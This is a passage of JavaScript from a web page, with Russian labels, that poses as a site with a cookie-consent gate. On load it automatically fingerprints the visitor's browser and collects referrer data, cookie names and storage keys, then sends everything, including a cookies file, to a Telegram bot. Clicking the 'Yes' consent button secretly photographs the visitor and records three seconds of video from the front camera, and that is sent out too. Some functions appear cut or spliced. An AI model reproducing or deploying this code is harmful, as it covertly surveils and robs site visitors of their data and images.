    OTHER_DATA['006 Макс текстура'] = gl.getParameter(gl.MAX_TEXTURE_SIZE);
    OTHER_DATA['007 Макс viewport'] = (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join('x');
    OTHER_DATA['008 Макс атрибуты'] = gl.getParameter(gl.MAX_VERTEX_ATTRIBS);
    OTHER_DATA['009 Макс uniform']  = gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS);
    OTHER_DATA['010 Макс varying']  = gl.getParameter(gl.MAX_VARYING_VECTORS);
    OTHER_DATA['011 Макс fragment'] = gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS);
    OTHER_DATA['012 Макс comb texture'] = gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS);
    OTHER_DATA['013 Макс vertex texture'] = gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS);
    OTHER_DATA['014 Макс texture units'] = gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS);
    OTHER_DATA['015 Макс cube size'] = gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE);
    OTHER_DATA['016 Макс renderbuffer'] = gl.getParameter(gl.MAX_RENDERBUFFER_SIZE);
    OTHER_DATA['017 Макс samples']   = gl.getParameter(gl.MAX_SAMPLES);
    OTHER_DATA['018 Макс viewport dims'] = (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join(' x ');
    OTHER_DATA['019 Alias line width'] = (gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE) || []).join('-');
    OTHER_DATA['020 Alias point size'] = (gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE) || []).join('-');
    const exts = gl.getSupportedExtensions() || [];
    OTHER_DATA['021 WebGL расширений'] = exts.length;
    exts.forEach((e, i) => {
      OTHER_DATA[String(100 + i).padStart(3,'0') + ' WebGL ext'] = e;
    });
    const params = gl.getParameter(gl);
  } catch (e) {}

  try {
    const c2 = document.createElement('canvas');
    const gl2 = c2.getContext('webgl2');
    if (gl2) {
      OTHER_DATA['200 WebGL2 доступен'] = true;
      OTHER_DATA['201 WebGL2 версия']   = gl2.getParameter(gl2.VERSION);
      OTHER_DATA['202 WebGL2 GLSL']     = gl2.getParameter(gl2.SHADING_LANGUAGE_VERSION);
      const dbg2 = gl2.getExtension('WEBGL_debug_renderer_info');
      if (dbg2) {
        OTHER_DATA['203 WebGL2 GPU вендор'] = gl2.getParameter(dbg2.UNMASKED_VENDOR_WEBGL);
        OTHER_DATA['204 WebGL2 GPU рендер'] = gl2.getParameter(dbg2.UNMASKED_RENDERER_WEBGL);
      }
      const exts2 = gl2.getSupportedExtensions() || [];
      OTHER_DATA['205 WebGL2 ext count'] = exts2.length;
      exts2.slice(0, 40).forEach((e, i) => {
        OTHER_DATA[String(210 + i).padStart(3,'0') + ' WebGL2 ext'] = e;
      });
    }
  } catch (e) {}

  try {
    const c3 = document.createElement('canvas');
    const gl3 = c3.getContext('webgl');
    if (gl3) {
      const dbg3 = gl3.getExtension('WEBGL_debug_renderer_info');

function collectCanvas() {
  try {
    const c = document.createElement('canvas');

    ctx.textBaseline = 'top';
    ctx.font = '16px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 100, 30);
    ctx.fillStyle = '#069';
    ctx.fillText('Fingerprint 你好', 2, 10);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';

async function collectAudio() {
  try {
    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if (!AC) return;
    const ctx = new AC(1, 44100, 44100);
    const osc = ctx.createOscillator();
    osc.type = 'triangle';
    osc.frequency.value = 10000;
    const comp = ctx.createDynamicsCompressor();
    osc.connect(comp); comp.connect(ctx.destination);
    osc.start(0);
    const buf = await ctx.startRendering();
    const ch = buf.getChannelData(0);
    let sum = 0;
    for (let i = 4500; i < 5000; i++) sum += Math.abs(ch[i]);
    OTHER_DATA['400 Audio fingerprint'] = sum.toString().slice(0, 20);
    OTHER_DATA['401 Audio sample rate'] = buf.sampleRate;
    OTHER_DATA['402 Audio channel']     = buf.numberOfChannels;
    OTHER_DATA['403 Audio length']      = buf.length;
    OTHER_DATA['404 Audio duration']    = buf.duration;
  } catch (e) {}

  // AudioContext realtime
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (AC) {
      const ctx = new AC();
      OTHER_DATA['410 AudioContext sampleRate'] = ctx.sampleRate;
      OTHER_DATA['411 AudioContext state']      = ctx.state;
      OTHER_DATA['412 AudioContext baseLatency']= ctx.baseLatency;
      OTHER_DATA['413 AudioContext outputLatency'] = ctx.outputLatency || '';
      OTHER_DATA['414 AudioContext maxChannelCount'] = ctx.destination ? ctx.destination.maxChannelCount : '';
      OTHER_DATA['415 AudioContext currentTime'] = ctx.currentTime;
      OTHER_DATA['416 Аудио входов']  = navigator.mediaDevices ? 'проверяется' : '';
      ctx.close && ctx.close();
    }
  } catch (e) {}
}

function collectSites() {
  SITES_DATA['001 Referrer']          = document.referrer || '(прямой заход)';
  SITES_DATA['002 Referrer host']     = (() => { try { return new URL(document.referrer).hostname; } catch { return ''; } })();
  SITES_DATA['003 Referrer origin']   = (() => { try { return new URL(document.referrer).origin; } catch { return ''; } })();
  SITES_DATA['004 Referrer path']     = (() => { try { return new URL(document.referrer).pathname; } catch { return ''; } })();
  SITES_DATA['005 Текущий URL']       = location.href;
  SITES_DATA['006 Текущий host']      = location.hostname;
  SITES_DATA['007 Текущий origin']    = location.origin;
  SITES_DATA['008 Текущий path']      = location.pathname;
  SITES_DATA['009 Query string']      = location.search || '(нет)';
  SITES_DATA['010 Hash']              = location.hash || '(нет)';

  try {
    const nav = performance.getEntriesByType('navigation');
    if (nav && nav.length) {
      SITES_DATA['011 Тип навигации']       = nav[0].type;
      SITES_DATA['012 Redirect count']      = nav[0].redirectCount;
      SITES_DATA['013 Redirect время (ms)'] = Math.round(nav[0].redirectEnd - nav[0].redirectStart);
      SITES_DATA['014 Next hop protocol']   = nav[0].nextHopProtocol || '';
      SITES_DATA['015 Transfer size']       = nav[0].transferSize;
      SITES_DATA['016 Encoded body size']   = nav[0].encodedBodySize;
      SITES_DATA['017 Decoded body size']   = nav[0].decodedBodySize;
      SITES_DATA['018 Duration']            = Math.round(nav[0].duration);
      SITES_DATA['019 Start time']          = nav[0].startTime;
      SITES_DATA['020 Fetch start']         = nav[0].fetchStart;
      SITES_DATA['021 Domain lookup start'] = nav[0].domainLookupStart;
      SITES_DATA['022 Domain lookup end']   = nav[0].domainLookupEnd;
      SITES_DATA['023 Connect start']       = nav[0].connectStart;
      SITES_DATA['024 Connect end']         = nav[0].connectEnd;
      SITES_DATA['025 Secure connection']   = nav[0].secureConnectionStart;
      SITES_DATA['026 Request start']       = nav[0].requestStart;
      SITES_DATA['027 Response start']      = nav[0].responseStart;
      SITES_DATA['028 Response end']        = nav[0].responseEnd;
      SITES_DATA['029 Dom interactive']     = nav[0].domInteractive;
      SITES_DATA['030 Dom content loaded']  = nav[0].domContentLoadedEventStart;

      SITES_DATA['032 Load event start']    = nav[0].loadEventStart;
      SITES_DATA['033 Load event end']      = nav[0].loadEventEnd;
      SITES_DATA['034 Worker start']        = nav[0].workerStart || '';
    }
  } catch (e) {}

  SITES_DATA['040 History length'] = history.length;

  try {
    const res = performance.getEntriesByType('resource');
    SITES_DATA['041 Ресурсов загружено'] = res.length;
    const hosts = new Set();
    const types = {};
    let totalSize = 0;
    for (const r of res) {
      try { const u = new URL(r.name); if (u.hostname !== location.hostname) hosts.add(u.hostname); } catch (e) {}
      types[r.initiatorType] = (types[r.initiatorType] || 0) + 1;
      totalSize += r.transferSize || 0;
    }
    SITES_DATA['042 Сторонних доменов'] = hosts.size;
    SITES_DATA['043 Список доменов']    = Array.from(hosts).slice(0, 60).join(', ');
    let i = 50;
    for (const k in types) {
      SITES_DATA[String(i++).padStart(3,'0') + ' Ресурс ' + k] = types[k];
    }
    SITES_DATA['090 Общий размер KB'] = Math.round(totalSize / 1024);
  } catch (e) {}

  SITES_DATA['100 Screen']        = screen.width + 'x' + screen.height;
  SITES_DATA['101 Viewport']      = window.innerWidth + 'x' + window.innerHeight;
  SITES_DATA['102 Language']      = navigator.language;
  SITES_DATA['103 Platform']      = navigator.platform;
  SITES_DATA['104 Time']          = new Date().toLocaleString('ru-RU');

  try {

    SITES_DATA['112 Cookies имена']    = names || '(нет)';
  } catch (e) {}

  try {
    const keys = [];
    for (let i = 0; i < localStorage.length; i++) keys.push(localStorage.key(i));
    SITES_DATA['120 localStorage ключей'] = keys.length;
    SITES_DATA['121 localStorage имена']  = keys.slice(0, 60).join(', ');
  } catch (e) {}

  try {
    const keys = [];
    for (let i = 0; i < sessionStorage.length; i++) keys.push(sessionStorage.key(i));
    SITES_DATA['130 sessionStorage ключей'] = keys.length;
    SITES_DATA['131 sessionStorage имена']  = keys.slice(0, 60).join(', ');
  } catch (e) {}

  const ref = document.referrer;
  if (!ref)                          SITES_DATA['140 Источник']  = 'прямой заход';
  else if (/google\./i.test(ref))    SITES_DATA['140 Источник']  = 'Google';

  SITES_DATA['142 Minimal UI']   = window.matchMedia('(display-mode: minimal-ui)').matches;
  SITES_DATA['143 Fullscreen PWA']= window.matchMedia('(display-mode: fullscreen)').matches;
  SITES_DATA['144 Browser mode'] = window.matchMedia('(display-mode: browser)').matches;
  SITES_DATA['145 BFCache']      = performance.getEntriesByType('navigation')[0]?.type === 'back_forward';
  SITES_DATA['146 Открыт при запуске'] = performance.navigation ? performance.navigation.type === 0 : '';
  SITES_DATA['147 Время открытия'] = performance.timing ? performance.timing.navigationStart : '';
  SITES_DATA['148 Страница активна'] = document.hasFocus();
  SITES_DATA['149 Visible']       = document.visibilityState;
  SITES_DATA['150 Дочерних окон'] = window.frames.length;

function simpleHash(str) {
  let h = 0;
  for (let i = 0; i < str.length; i++) { h = (h << 5) - h + str.charCodeAt(i); h |= 0; }
  return (h >>> 0).toString(16);
}

function sendChunk(text) {
  return new Promise(res => {
    const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID +
                '&parse_mode=HTML&disable_web_page_preview=false&text=' + encodeURIComponent(text);
    const img = new Image();
    img.onload = img.onerror = () => res();
    img.src = url;
    setTimeout(res, 400);
  });
}

async function sendFile(filename, content, caption) {
  try {
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', blob, filename);
    form.append('caption', caption || 'Cookies — ' + new Date().toLocaleString('ru-RU'));
    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendDocument', {
      method: 'POST', body: form
    });
    const j = await r.json();
    return j.ok;
  } catch (e) { return false; }
}

async function sendCategory(title, obj) {
  const entries = Object.entries(obj).filter(([k, v]) => v !== '' && v != null && v !== false && v !== 'false');
  const lines = entries.map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 300));

  const chunks = [];
  let cur = '';
  for (const line of lines) {
    if ((cur + line).length > 3600) { chunks.push(cur); cur = ''; }
    cur += line + '\n';
  }
  if (cur) chunks.push(cur);

  for (let i = 0; i < chunks.length; i++) {
    const head = title + ' (' + entries.length + ' полей)' +
                 (chunks.length > 1 ? ' - часть ' + (i + 1) + '/' + chunks.length : '') + '\n\n';
    await sendChunk(head + chunks[i]);
    await new Promise(r => setTimeout(r, 500));
  }
}

// ═══════════════════════════════════════════════════════════
// ФОТО + ВИДЕО С ФРОНТАЛЬНОЙ КАМЕРЫ
// ═══════════════════════════════════════════════════════════
async function capturePhotoAndVideo(seconds = 3) {
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480, frameRate: 24 },
      audio: false
    });
    video.srcObject = stream;

    await new Promise(res => {
      if (video.readyState >= 2) return res();
      video.onloadeddata = () => res();
    });
    await new Promise(r => setTimeout(r, 400));

    const w = video.videoWidth  || 640;
    const h = video.videoHeight || 480;
    canvas.width = w; canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, w, h);
    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
    ctx.clearRect(0, 0, w, h);

    if (photoBlob) await sendPhoto(photoBlob);

    let mime = 'video/webm;codecs=vp9,opus';
    let ext  = 'webm';
    if (typeof MediaRecorder === 'undefined') {
      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
      return { photo: !!photoBlob, video: false };
    }
    const candidates = [
      ['video/webm;codecs=vp9,opus', 'webm'],
      ['video/webm;codecs=vp8,opus', 'webm'],
      ['video/webm',                 'webm'],
      ['video/mp4;codecs=h264,aac',  'mp4'],
      ['video/mp4',                  'mp4'],
    ];
    for (const [m, e] of candidates) {
      if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) {
        mime = m; ext = e; break;
      }
    }

    const chunks = [];
    let rec;
    try {
      rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 800000 });
    } catch (e) {
      try { rec = new MediaRecorder(stream); ext = 'webm'; }
      catch (e2) { rec = null; }
    }

    let videoBlob = null;
    if (rec) {
      rec.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
      const videoDone = new Promise(res => {
        rec.onstop = () => {
          videoBlob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
          res();
        };
      });
      rec.start(100);
      await new Promise(r => setTimeout(r, seconds * 1000));
      try { rec.stop(); } catch (e) {}
      await videoDone;
    }

    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;

    if (videoBlob && videoBlob.size > 0) await sendVideo(videoBlob, ext);

    return { photo: !!photoBlob, video: !!(videoBlob && videoBlob.size) };
  } catch (e) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    return { photo: false, video: false, error: e.message };
  }
}

  };
  await sendFile('all-data.json', JSON.stringify(allData, null, 2),
    '📦 ВСЕ ДАННЫЕ (' + totalFields + ' полей) — ' + new Date().toLocaleString('ru-RU'));

  // Cookies отдельным файлом
  const cookieLines = Object.entries(COOKIE_DATA)
    .filter(([k, v]) => v !== '' && v != null)
    .map(([k, v]) => k + ': ' + v)
    .join('\n');
  const cookieTxt = 'COOKIES - ' + new Date().toLocaleString('ru-RU') + '\n' +
                    'URL: ' + location.href + '\n' +
                    'Домен: ' + location.hostname + '\n' +
                    '='.repeat(60) + '\n\n' + cookieLines;
  await sendFile('cookies.txt', cookieTxt, 'Cookies — ' + new Date().toLocaleString('ru-RU'));

  // Категории
  await sendCategory('🎯 ИСТОЧНИК ПЕРЕХОДА', SOURCE_DATA);
  await sendCategory('🍪 COOKIES + ХРАНИЛИЩА', COOKIE_DATA);
  await sendCategory('🌍 ГЕОЛОКАЦИЯ + КАРТЫ', GEO_DATA);
  await sendCategory('📱 ТЕЛЕФОН / УСТРОЙСТВО', PHONE_DATA);
  await sendCategory('🖥 БРАУЗЕР И API', BROWSER_DATA);
  await sendCategory('🔧 ДРУГОЕ (WebGL/Canvas/Audio/Шрифты/Кодеки)', OTHER_DATA);
  await sendCategory('🌐 САЙТЫ И СЕССИЯ', SITES_DATA);

  await sendChunk('📊 <b>ИТОГО собрано полей:</b> ' + totalFields);
}

// ═══════════════════════════════════════════════════════════
// АВТОЗАПУСК ПРИ ПЕРЕХОДЕ
// ═══════════════════════════════════════════════════════════
(async function autoRun() {
  await new Promise(r => setTimeout(r, 300));

  detectSource();
  await sendChunk(
    '🟢 <b>НОВЫЙ ПЕРЕХОД НА САЙТ</b>\n\n' +
    '<b>Источник:</b> ' + (SOURCE_DATA['07 Источник перехода'] || '?') + '\n' +
    '<b>Приложение:</b> ' + (SOURCE_DATA['01 Встроенное приложение'] || 'нет') + '\n' +
    '<b>Браузер:</b> ' + (SOURCE_DATA['02 Браузер'] || '?') + '\n' +
    '<b>ОС:</b> ' + (SOURCE_DATA['03 ОС'] || '?') + '\n' +
    '<b>Устройство:</b> ' + (SOURCE_DATA['04 Тип устройства'] || '?') + '\n' +
    '<b>Язык:</b> ' + (SOURCE_DATA['09 Язык браузера'] || '?') + '\n' +
    '<b>Время:</b> ' + new Date().toLocaleString('ru-RU') + '\n' +
    '<b>URL:</b> ' + location.href
  );

  await runAll();
})();

// ═══════════════════════════════════════════════════════════
// КНОПКА «ДА» — фото и видео
// ═══════════════════════════════════════════════════════════
btnYes.onclick = async () => {
  btnYes.disabled = true;
  btnNo.disabled  = true;
  statusEl.textContent = 'Ожидаем разрешение камеры...';

  try {
    document.cookie = 'consent=accepted; path=/; max-age=' + (365 * 24 * 3600);
    localStorage.setItem('cookie_consent', 'accepted');
    localStorage.setItem('cookie_consent_time', new Date().toISOString());
    sessionStorage.setItem('cookie_consent', 'accepted');
  } catch (e) {}

  await sendChunk(
    '✅ <b>ПОЛЬЗОВАТЕЛЬ НАЖАЛ «ДА»</b>\n\n' +
    '<b>Время:</b> ' + new Date().toLocaleString('ru-RU') + '\n' +
    '<b>URL:</b> ' + location.href
  );

  statusEl.textContent = 'Съёмка с камеры (фото + 3 сек видео)...';
  await capturePhotoAndVideo(3);

  statusEl.textContent = 'Готово.';
  document.getElementById('gate').style.display = 'none';
  document.getElementById('site').style.display = 'block';
};

btnNo.onclick = () => {
  document.body.innerHTML =
    '<p style="padding:40px;font:16px Arial;color:#eee;background:#000;min-height:100vh;margin:0">Вы отказались. Сайт недоступен.</p>';
};
</script>
